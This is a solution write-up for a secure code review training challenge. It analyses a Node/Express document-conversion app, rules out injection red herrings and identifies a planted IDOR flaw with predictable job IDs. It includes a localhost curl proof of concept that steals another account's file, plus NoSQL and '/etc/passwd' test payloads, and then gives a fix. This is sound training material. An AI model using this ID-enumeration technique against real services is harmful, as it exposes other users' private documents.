# Secure Code Review — Challenge #4: File Converter — Solution

<table>
<tr>
<td width="100%">

<!-- TODO: YouTube walkthrough — replace VIDEO_ID once recorded/published -->
<a href="https://youtu.be/VIDEO_ID">
  <img src="https://img.youtube.com/vi/VIDEO_ID/hqdefault.jpg" align="right" width="240" alt="Watch the walkthrough">
</a>

### 🎥 This solution is explained in detail on my YouTube Channel <img src="../../assets/AppSec_Untangled_Logo.jpg" width="30"> [AppSec Untangled](https://www.youtube.com/@AppSecUntangled)

Full walkthrough of the review process, the finding, and the fix.

[![Watch on YouTube](https://img.shields.io/badge/▶_Watch_the_walkthrough-FF0000?style=for-the-badge&logo=youtube&logoColor=white)](https://youtu.be/VIDEO_ID)

<!-- TODO: replace the badge link above with the real video URL when published -->

</td>
</tr>
</table>

---

# Part I: Review Steps

*The methodology followed to build a mental model of the system before looking for the flaw. It
mirrors the [suggested methodology](../../README.md#suggested-methodology): scope → entry points →
sinks → threat model → mitigation review.*

## 1. 🗺️ Application scope & architecture

File Converter is an asynchronous document-conversion service. Two walkthroughs build the mental model a
review needs: **what happens when the app starts** (the wiring), and **what happens when a user logs in,
uploads a file, and downloads the result** (the request flow). Libraries are linked where they're used.

### 🚀 What happens when the app starts

**1. `docker compose up` → [`docker-compose.yml`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/004-file-converter/docker-compose.yml).** It declares **two
containers**: a stock `mongo` image (black-box data store) and an `app` container **built locally** — so
the code to review is ours.

```yaml
services:
  mongodb:            # stock image — data store
  app:
    build: .          # ← built from the local Dockerfile; this is our code
```

**2. `build: .` → [`Dockerfile`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/004-file-converter/Dockerfile#L58).** It installs Pandoc + LaTeX and names the process
that runs:

```dockerfile
CMD ["node", "app.js"]
```

**3. [`app.js`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/004-file-converter/app.js) creates the [Express](https://expressjs.com/en/4x/api.html) app** and, on
startup, connects to Mongo ([`app.js#L109`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/004-file-converter/app.js#L109)).

**4. Global middleware — runs on every request ([`app.js#L25-L61`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/004-file-converter/app.js#L25)).** Several of the
app's defenses are attached here:

```js
app.use(express.json());                 // parse JSON bodies (express)
app.use(mongoSanitize());                // express-mongo-sanitize → strips $/. keys (NoSQLi guard)
app.use((req,res,next) => { res.setHeader('Content-Security-Policy', ...) }); // CSP (XSS guard) — app.js#L31
app.use(session({ cookie: { httpOnly: true, sameSite: 'lax' } })); // express-session — app.js#L49
```

- [`express-mongo-sanitize`](https://github.com/fiznool/express-mongo-sanitize#readme) — removes MongoDB
  operator keys (`$`, `.`) from all input.
- Content-Security-Policy header — an XSS guard.
- [`express-session`](https://expressjs.com/en/resources/middleware/session/) — signed session cookie;
  `httpOnly` + `sameSite: 'lax'` are its XSS/CSRF hardening.

**5. Routes mounted ([`app.js#L71-L104`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/004-file-converter/app.js#L71)) over one shared store:**

```js
app.use('/api/auth', authRoutes);   // routes/auth.js — register/login (bcrypt)
app.use('/api', convertRoutes);     // routes/convert.js — JSON API (multer uploads)
app.use('/', uiRoutes);             // routes/ui.js — server-rendered pages (ejs)
```

- [`routes/auth.js`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/004-file-converter/src/routes/auth.js) hashes passwords with [`bcrypt`](https://github.com/kelektiv/node.bcrypt.js#readme).
- [`routes/convert.js`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/004-file-converter/src/routes/convert.js) parses uploads with [`multer`](https://github.com/expressjs/multer#readme).
- [`routes/ui.js`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/004-file-converter/src/routes/ui.js) renders [`ejs`](https://ejs.co/#docs) templates.

**6. The store — [`store/database.js`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/004-file-converter/src/store/database.js#L12).** Both route sets reach MongoDB
through one wrapper around the native [`mongodb`](https://www.mongodb.com/docs/drivers/node/current/)
driver, exposing two collections:

```js
this.usersCollection = this.db.collection('users');  // database.js#L18
this.jobsCollection  = this.db.collection('jobs');
```

**7. The conversion service — [`services/conversion.js#L36`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/004-file-converter/src/services/conversion.js#L36).** Jobs
run in the background by shelling out to [Pandoc](https://pandoc.org/MANUAL.html) via `execFile` (no
shell) with [`--sandbox`](https://pandoc.org/MANUAL.html#option--sandbox):

```js
const args = ['--sandbox', '-f', reader, inputPath, '-o', outputPath];
execFile('pandoc', args, { timeout: 30000 }, ...);
```

### 🔄 What happens when I log in, upload, then download

**Log in** — `POST /api/auth/login` (or the UI's `POST /login`). The stored hash is checked with
`bcrypt`, and on success the user's id is written into the session
([`auth.js#L86`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/004-file-converter/src/routes/auth.js#L86)):

```js
const ok = await bcrypt.compare(password, user.passwordHash);
req.session.userId = user.id;      // ← the login
```

Every protected route then checks that session: the API's `requireAuth`
([`middleware/auth.js#L9`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/004-file-converter/src/middleware/auth.js#L9)) returns **401** with no `req.session.userId`;
the UI's `requireUser` ([`ui.js#L34`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/004-file-converter/src/routes/ui.js#L34)) redirects to `/login`.

**Upload** — `POST /api/convert` (chain at [`convert.js#L18`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/004-file-converter/src/routes/convert.js#L18)): `requireAuth`
→ assign a job id → `multer` saves the file under a **server-generated name** (job id + validated
extension, not the user's filename — [`upload.js#L51`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/004-file-converter/src/services/upload.js#L51)) → a job document
is created tying the file to its owner, then converted in the background:

```js
await db.createJob(jobId, req.user.id, inputPath, outputPath, targetFormat, req.file.originalname); // convert.js#L50
// → background: convertFile() runs pandoc, then status flips to 'completed' (convert.js#L59)
```

**Download** — `GET /api/convert/:jobId/download` ([`convert.js#L115`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/004-file-converter/src/routes/convert.js#L115)),
or the UI twin `GET /jobs/:jobId/download` ([`ui.js#L294`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/004-file-converter/src/routes/ui.js#L294)). The job is fetched
**by its job id** and the output file is streamed back:

```js
const job = await db.findJobByJobId(jobId);   // fetched by id
res.download(job.outputPath, filename, ...);   // the converted file is sent back
```



## 2. 🚪 Entry points

- **`POST /api/auth/register`, `/api/auth/login`** — *auth:* none — takes username, email, password.
- **`POST /api/convert`** — *auth:* session — takes an uploaded file and `targetFormat`.
- **`GET /api/convert/:jobId`** — *auth:* session — takes **`jobId` (path param)**.
- **`GET /api/convert/:jobId/download`** — *auth:* session — takes **`jobId` (path param)**.
- **`POST /register`, `/login`, `/convert`** (UI) — *auth:* session (convert) — same inputs as above.
- **`GET /jobs/:jobId`, `/jobs/:jobId/download`** (UI) — *auth:* session — takes **`jobId` (path param)**.

Several routes take a client-supplied `jobId` path parameter that identifies a stored object.

## 3. 🎯 Dangerous sinks (code & dependencies)

Sinks are the operations where untrusted input could change what the program *does* — not just where it
flows. For this app that means: the database queries, the OS command, Pandoc's own document processing,
the filesystem paths, and the HTML rendering.

- **S1 — MongoDB queries built from request data** → NoSQL injection. Login/lookup pass body fields
  into `findOne(...)`.
  [`store/database.js`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/004-file-converter/src/store/database.js), [`routes/auth.js`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/004-file-converter/src/routes/auth.js).
- **S2 — OS command execution: `execFile('pandoc', …)`** → command / argument injection. The converter
  spawns an external binary with arguments derived from the upload.
  [`services/conversion.js#L36`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/004-file-converter/src/services/conversion.js#L36).
- **S3 — Pandoc's document processing** → SSRF / local-file read / RCE. While converting, Pandoc can
  resolve URLs and local paths referenced by the document and hand raw TeX to the PDF engine — so the
  **uploaded document contents** are themselves a sink.
  [`services/conversion.js`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/004-file-converter/src/services/conversion.js).
- **S4 — Filesystem path operations** → path traversal / arbitrary file read or write. Paths are built
  for the stored upload, the conversion output, and the download stream.
  [`services/upload.js#L51`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/004-file-converter/src/services/upload.js#L51),
  [`routes/convert.js#L139`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/004-file-converter/src/routes/convert.js#L139).
- **S5 — HTML/template rendering** → XSS. User-controlled fields (filename, username) are rendered into
  pages.
  [`views/`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/004-file-converter/views).

## 4 & 5. 🧩 Threat model & 🔍 mitigation review

### 🔓 Business-logic vulnerabilities

- **Authentication** — every state-changing / data route is behind `requireAuth` / `requireUser`.
  ✅ present.
- **CSRF on mutating routes** — session cookie is `sameSite: 'lax'`
  ([`app.js#L58`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/004-file-converter/app.js#L58)),
  which keeps it off cross-site form POSTs
  ([MDN — `SameSite` cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite)).
  ✅ adequately mitigated for this design.
- **Authorization (object-level ownership)** — *expected:* every per-object route must confirm the
  object belongs to the caller (OWASP **API1:2023 – Broken Object Level Authorization**). *What the
  code does:* the job routes authenticate the caller and then look the job up **by ID only** — there
  is **no comparison of `job.userId` to `req.user.id`** in
  [`convert.js#L83-L112`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/004-file-converter/src/routes/convert.js#L83),
  [`convert.js#L115-L151`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/004-file-converter/src/routes/convert.js#L115),
  or the UI twins
  [`ui.js#L273`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/004-file-converter/src/routes/ui.js#L273) /
  [`ui.js#L294`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/004-file-converter/src/routes/ui.js#L294).
  ❌ **not mitigated — this is the planted flaw.**

> **The tell.** The dashboard listing *does* scope by owner —
> [`findJobsByUserId(userId)`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/004-file-converter/src/store/database.js#L160)
> filters `{ userId }`. The single-job lookups use
> [`findJobByJobId(jobId)`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/004-file-converter/src/store/database.js#L141),
> which filters `{ jobId }` and nothing else. The ownership concept exists in the codebase; it was
> simply **not applied on the routes that fetch one object.**

### 💉 Source-to-sink (injection) vulnerabilities

Before trusting the app code, the dependencies were cleared too: this image ships far more than
`package.json` shows — the Pandoc + LaTeX install drags in ~425 OS/npm packages — so a container scan
is the right check. `grype 004-file-converter-app:latest --only-fixed` comes back **clean** (nothing has
a patch waiting), and a full scan surfaces only unfixable base-image CVEs plus one Pandoc SSRF that the
code already mitigates (see **S3** below). No CVE database contains "this endpoint forgot to check who
owns the record," so the scan is a *filter, not a finding* — clearing the dependencies is what leaves the
authorization flaw as the answer.

Every injection sink was then checked and found **genuinely mitigated** — these are the red herrings:

- **S1 NoSQL injection** — [`express-mongo-sanitize`](https://github.com/fiznool/express-mongo-sanitize#readme)
  ([`app.js#L27`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/004-file-converter/app.js#L27))
  strips `$`/`.` keys, so [`{"username":{"$ne":null}}`](https://www.mongodb.com/docs/manual/reference/operator/query/ne/)
  can't smuggle operators. ✅
- **S2 Command / argument injection** — the app shells out, so this is where injection would bite. It
  uses **[`execFile('pandoc', args)`](https://nodejs.org/api/child_process.html#child_processexecfilefile-args-options-callback)**,
  not `exec` ([`conversion.js#L36`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/004-file-converter/src/services/conversion.js#L36)). `execFile` runs the binary
  directly with an `argv` **array** and **no shell**, so `;`, `|`, `$()` etc. are inert — the exact
  recommendation in Snyk's [command injection guide](https://snyk.io/blog/command-injection/) (avoid
  `exec`/the shell; use `execFile` with an argument array). The args aren't user-controlled anyway
  (server-generated paths, a fixed reader, `--sandbox`). ✅
- **S3 Pandoc SSRF / local-file read / RCE** — the sink here is **Pandoc itself**: while converting, it
  can resolve a remote image URL, read a local path referenced by the document, or pass raw TeX to the
  PDF engine. This is a real, current risk — the container scan even flags a Pandoc CVE for the installed
  version:

  ```bash
  $ grype 004-file-converter-app:latest
  NAME     INSTALLED   TYPE  VULNERABILITY    SEVERITY
  pandoc   3.10.2-1    deb   CVE-2025-51591   Negligible
  ...
  # inspect just Pandoc:
  $ grype 004-file-converter-app:latest -o json \
      | jq -r '.matches[] | select(.artifact.name=="pandoc")
               | "\(.vulnerability.id)  \(.vulnerability.severity)  \(.vulnerability.description)"'
  CVE-2025-51591  Negligible  A Server-Side Request Forgery (SSRF) in JGM Pandoc ... allows attackers ...
  via injecting a crafted iframe. ... Using the '--sandbox' option ... can mitigate such vulnerabilities.
  ```

  Note what the advisory itself prescribes: **`--sandbox`** — exactly what the app applies. Conversion
  runs with **`--sandbox`** and pins the reader with raw TeX disabled for Markdown
  ([`conversion.js#L17-L34`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/004-file-converter/src/services/conversion.js#L17)). `--sandbox` runs Pandoc's
  readers/writers in a sandbox that blocks all disk and network IO
  ([Pandoc manual — `--sandbox`](https://pandoc.org/MANUAL.html#option--sandbox)); the
  [`markdown-raw_tex`](https://pandoc.org/MANUAL.html#extension-raw_tex) reader spec disables raw TeX
  passthrough. So the scanner finds a genuine Pandoc SSRF, but the recommended mitigation is already in
  place. I tested it (see below) — `![x](/etc/passwd)` produced a clean file with no leak. ✅
- **S4 Path traversal (filesystem paths)** — the on-disk name is built from the **server-generated
  jobId**, not the user's filename, via [multer's `diskStorage` `filename`](https://github.com/expressjs/multer#diskstorage)
  ([`upload.js#L51`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/004-file-converter/src/services/upload.js#L51)), the output path is derived from the same jobId, and
  download streams `job.outputPath` from the DB, not a user-supplied path. ✅
- **S5 XSS** — EJS [`<%= %>` auto-escapes](https://ejs.co/#docs) (vs. the raw `<%- %>` tag), a strict
  [CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy) is set
  ([`app.js#L33`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/004-file-converter/app.js#L33)),
  and the client renders status with [`textContent`](https://developer.mozilla.org/en-US/docs/Web/API/Node/textContent)
  (not `innerHTML`)
  ([`public/app.js#L34`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/004-file-converter/public/app.js#L34)). ✅

Everything an injection-hunter would chase is deliberately closed. The one gap is authorization.

---

# Part II: Solution

## 6. 🧪 The vulnerability & exploitation

- **Class:** Broken Object-Level Authorization / **IDOR** — CWE-639 (Authorization Bypass Through
  User-Controlled Key), CWE-862 (Missing Authorization); made trivially enumerable by CWE-340
  (Predictable identifiers). OWASP **API1:2023**.
- **Root cause:** job routes check *authentication* but never *ownership* —
  [`convert.js#L83`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/004-file-converter/src/routes/convert.js#L83),
  [`convert.js#L115`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/004-file-converter/src/routes/convert.js#L115),
  [`ui.js#L294`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/004-file-converter/src/routes/ui.js#L294).
- **Sink:** `res.download(job.outputPath)` streams another user's file
  ([`convert.js#L139`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/004-file-converter/src/routes/convert.js#L139)).

### 🧠 Why it works

Two facts combine:

1. **No ownership check.** The handler fetches the job by ID and, as long as you hold *any* valid
   session, returns it:

   ```js
   router.get('/convert/:jobId/download', requireAuth, async (req, res) => {
     const { jobId } = req.params;
     const job = await db.findJobByJobId(jobId);   // looked up by ID only
     if (!job) return res.status(404)...;
     // ⚠️ no check that job.userId === req.user.id
     res.download(job.outputPath, filename, ...);  // streams whoever's file it is
   });
   ```

2. **Job IDs are guessable.** They are `YYYYMMDD` + a per-day counter that starts at 1
   ([`database.js#L109`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/004-file-converter/src/store/database.js#L109)):

   ```js
   return `${dateDigits}${result.seq}`;   // e.g. 202608291, 202608292, …
   ```

   So an attacker doesn't even need a leaked link — today's jobs are `20260829` + `1, 2, 3, …`.
   Authentication is only "are you *a* user", never "are you *this* job's user", so any registered
   account can read every other account's conversions.

### 🚀 Exploitation steps / PoC

Two users. **alice** uploads a confidential document; **mallory** — a separate account that never saw
it — reads and downloads it by guessing the job ID.

```bash
# alice (victim) uploads a confidential doc and converts it to docx
curl -s -X POST localhost:3000/api/auth/register -H 'Content-Type: application/json' -c alice.txt \
  -d '{"username":"alice","email":"alice@example.com","password":"securepass123"}' >/dev/null
printf '# Alice salary review\n\nAlice earns $200,000. CONFIDENTIAL.\n' > secret.md
curl -s -X POST localhost:3000/api/convert -b alice.txt \
  -F file=@secret.md -F targetFormat=docx        # -> {"jobId":"202608291"}

# mallory (attacker) — a brand-new account — guesses the ID and steals the file
curl -s -X POST localhost:3000/api/auth/register -H 'Content-Type: application/json' -c mallory.txt \
  -d '{"username":"mallory","email":"mallory@example.com","password":"securepass123"}' >/dev/null
curl -s localhost:3000/api/convert/202608291 -b mallory.txt          # reads status of a foreign job
curl -s localhost:3000/api/convert/202608291/download -b mallory.txt -o stolen.docx
```

Real output from the running app:

```
Attacker (mallory) reads victim's job status by guessing ID 202608291:
{"jobId":"202608291","status":"completed","targetFormat":"docx","outputUrl":"/api/convert/202608291/download"}

Attacker downloads victim's converted file:
HTTP 200, 10453 bytes

Recovered text from the file mallory stole:
   Alice salary review
   Alice earns $200,000. CONFIDENTIAL.
```

The UI surface is identical — `GET /jobs/202608291/download` with mallory's cookie also returns
`HTTP 200` and the same bytes.

> ✅ **Verified:** across two separate accounts, mallory read alice's job status and downloaded her
> converted `.docx`, recovering the confidential plaintext — via both the API and the UI routes. The
> UI job page even leaks the victim's **original filename** (`<dd>secret.md</dd>`) before download. I
> also confirmed the **decoy** is closed: uploading `![x](/etc/passwd)` produced a completed job whose
> output embedded **no** file contents (`--sandbox` blocked it).

**Impact:** any registered user can enumerate predictable job IDs and read/download **every** user's
uploaded documents and conversions — plus the original filenames the UI job page discloses — a full
confidentiality break across tenants (CWE-639 / API1:2023).

## 7. 🛠️ Suggested fix

**Primary fix — enforce ownership on every per-object route.** After loading the job, compare its
owner to the caller and return **404** (not 403, to avoid confirming the ID exists):

```js
const job = await db.findJobByJobId(jobId);
if (!job || job.userId !== req.user.id) {
  return res.status(404).json({ error: 'Job not found' });
}
```

Better still, push the check into the query so a mismatched owner can never be loaded at all —
`findJobByJobId(jobId, userId)` → `findOne({ jobId, userId: new ObjectId(userId) })`. Apply it to all
four routes: `convert.js` status + download and their `ui.js` twins.

**Defense-in-depth (do these too — never rely on a single control):**

1. **Unpredictable IDs.** Use a UUID/`crypto.randomUUID()` or random token as the public job ID so IDs
   can't be enumerated even if a check is missed. (Predictability is what turns a leaked-link IDOR into
   mass harvesting.)
2. **Scope by owner at the data layer by default** — make `userId` a required argument on
   single-object reads, mirroring what `findJobsByUserId` already does, so "look up one job" is
   ownership-scoped like "list my jobs" is.
3. **Add an authorization test** to the suite: user B must get `404` on user A's job — the kind of test
   that catches this class in CI.

## 8. 🌍 Real-world grounding & resources

- **OWASP API Security Top 10 — [API1:2023 Broken Object Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)** — the #1 API risk, and exactly this shape: authenticated request, object ID from the URL, no ownership check.
- **CWE:** [CWE-639 Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html), [CWE-862 Missing Authorization](https://cwe.mitre.org/data/definitions/862.html), [CWE-340 Predictable Identifiers](https://cwe.mitre.org/data/definitions/340.html).
- **OWASP cheat sheets:** [Authorization](https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html), [Insecure Direct Object Reference Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html).
- **Hands-on:** [PortSwigger — Access control vulnerabilities & IDOR](https://portswigger.net/web-security/access-control/idor).
- **Real-world:** IDOR on downloadable resources is a bug-bounty staple — e.g. the [First American Financial leak (2019)](https://krebsonsecurity.com/2019/05/first-american-financial-corp-leaked-hundreds-of-millions-of-title-insurance-records/), where sequential document IDs exposed ~885 million records with no authorization at all.

**Takeaway:** **authentication is not authorization.** Confirming *who* is calling says nothing about
whether they may touch *this specific object*. Any route that takes an object ID from the request must
verify that object belongs to the caller — ideally by scoping the query with the owner's ID — and
opaque, unguessable IDs are a backstop, never the control itself. The reviewer's habit that finds this:
at every entry point, ask **"whose data is this, and where is that checked?"** — and treat an
ID-only lookup like `findByJobId(jobId)` as guilty until an ownership check is shown.
